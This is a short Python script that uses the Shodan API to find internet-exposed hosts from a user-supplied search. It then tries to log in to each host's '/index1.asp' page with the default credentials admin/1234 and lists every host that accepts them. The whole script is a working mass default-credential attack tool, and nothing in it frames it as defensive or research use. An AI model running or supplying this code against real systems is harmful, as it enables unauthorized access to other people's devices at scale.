import requests
import shodan

SHODAN_API_KEY = ''
api = shodan.Shodan(SHODAN_API_KEY)
e = shodan.APIError
ports = []
search = str(input("Search method:"))

try:
    results = api.search(search)
    print('Results found: {}'.format(results['total']))
    for result in results['matches']:
        print('IP: {}'.format(result['ip_str']))
        ip = result['ip_str']
        port = result['port']
        url = "http://%s:%d/index1.asp" % (ip, port)
        try:
            r = requests.get(url, auth=('admin', '1234'))
        except:
            continue
        if r.status_code == 200:
            print('Success')
            ports.append((ip, port))

except e:
    print('Error:{}'.format(e))
